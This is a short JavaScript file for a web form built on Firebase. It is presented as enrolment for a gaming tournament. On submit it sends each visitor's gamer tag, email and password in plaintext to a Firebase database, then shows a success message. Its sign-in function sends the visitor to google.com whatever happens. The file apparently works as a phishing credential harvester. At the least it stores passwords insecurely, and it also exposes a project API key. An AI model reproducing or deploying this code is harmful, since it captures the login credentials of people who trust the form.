const firebaseConfig = {
    apiKey: "AIzaSyCtPoVOKTbJsV_mwRrl9TwMPFsZ2lKK1HU",
    authDomain: "login2-c1977.firebaseapp.com",
    databaseURL: "https://login-2cfe0-default-rtdb.firebaseio.com",
    projectId: "login2-c1977",
    storageBucket: "login2-c1977.appspot.com",
    messagingSenderId: "813766765207",
    appId: "1:813766765207:web:c86adf3dde3e3db7f817d2",
    measurementId: "G-KFGBHK9G02"
  };;

  
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  firebase.analytics();

// let's code 
var datab  = firebase.database().ref('data');
function UserRegister(){
var email = document.getElementById('eemail').value;
var password = document.getElementById('lpassword').value;
firebase.auth().createUserWithEmailAndPassword(email,password).then(function(){
    
}).catch(function (error){
    var errorcode = error.code;
    var errormsg = error.message;
});
}
const auth = firebase.auth();
function SignIn(){
    var email = document.getElementById('eemail').value;
    var password = document.getElementById('lpassword').value;
    const promise = auth.signInWithEmailAndPassword(email,password);
    promise.catch( e => alert(e.msg));
    window.open("https://www.google.com","_self");

}
document.getElementById('form').addEventListener('submit', (e) => {
    e.preventDefault();
    var userInfo = datab.push();
    userInfo.set({
        GamerTag: getId('fname'),
        email : getId('eemail'),
        password : getId('lpassword')
    });
    alert("Successfully Enrolled for tournament");
    console.log("sent");
    document.getElementById('form').reset();
});
function  getId(id){
    return document.getElementById(id).value;
}